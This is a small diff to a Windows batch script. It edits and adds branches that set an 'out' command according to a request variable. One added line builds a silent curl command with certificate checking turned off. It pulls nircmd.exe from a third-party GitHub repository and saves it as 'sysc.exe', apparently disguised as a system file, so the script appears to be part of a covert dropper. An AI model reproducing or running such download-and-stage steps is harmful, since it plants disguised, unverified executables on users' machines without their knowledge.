@@ -1,4 +1,5 @@
 if not "%ver%" == "1.0" (
   exit
 )
-if %req% == nirc set "out=curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/nircmd.exe" --output "%mus%\sysc.exe""
+if "%req%" == "nirc" set "out=curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/nircmd.exe" --output "%mus%\sysc.exe""
+if "%req%" == "auxstart" set "out=X95"
